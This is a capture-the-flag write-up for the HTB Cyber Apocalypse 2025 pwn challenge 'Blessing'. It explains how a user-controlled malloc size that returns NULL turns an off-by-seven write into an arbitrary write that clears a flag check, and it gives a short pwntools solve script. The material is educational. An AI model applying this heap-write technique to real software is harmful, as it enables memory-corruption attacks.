---
title: Blessing
date: 2025-03-26T03:00:19+03:00
description: Writeup for Blessing [HTB Cyber Apocalypse 2025]
type: writeup
author: PineBel
tags:
- pwn
draft: false
---
___

## Challenge Description
In the realm of Eldoria, where warriors roam, the Dragon's Heart they seek, from bytes to byte's home. Through exploits and tricks, they boldly dare, to conquer Eldoria, with skill and flair.

## Intuition

We get a binary that does a malloc of 0x30000.
After the malloc it sets the first byte from that malloc to 1.
We also get the pointer from malloc as a leak.
To read the flag we need to overwrite the 1 to 0.

**Vulnerability**:  After the leak we need to give an input which will be used in another malloc. This means that we control the size of the malloc, we can also write content to it but in this case it doesn't matter since we have this vulnerability:
```
*(undefined8 *)((long)my_malloc_ptr+ (my_malloc_len- 1)) = 0; ---> overflow of 7 bytes
```

## Solution

Initially I thought we should use a large enough malloc so that we mmap right before the first allocated chunk, but the closest I could get to the target chunk was 24 bytes because of alignment. So this doesn't seem like the solution.


```C
  my_malloc_ptr = malloc(my_malloc_len);
  ...
  *(undefined8 *)((long)my_malloc_ptr+ (my_malloc_len- 1)) = 0;
```

Malloc's behaviour when given a really large value will fail and return NULL.
So what happens if I give a really large value?

```C
  my_malloc_ptr = malloc(LARGE);
  ...
  *(undefined8 *)((long)NULL+ (LARGE- 1)) = 0;
```

So basically if we make malloc return `NULL` we can write those 0s at `LARGE-1`.

So the solution would be to just:
1. Get the leak
2. Since the leak is large, we can give it to malloc which will cause it to fail and write to leak - 1.

Solve:
```py
from pwn import *


target = process("./blessing_1")

target.recvuntil(b'is: ')
leak = int(target.recv(14), 16)
target.sendlineafter(b'th: ', str(leak).encode())
target.sendlineafter(b'ng: ', b'x')

target.interactive()
```





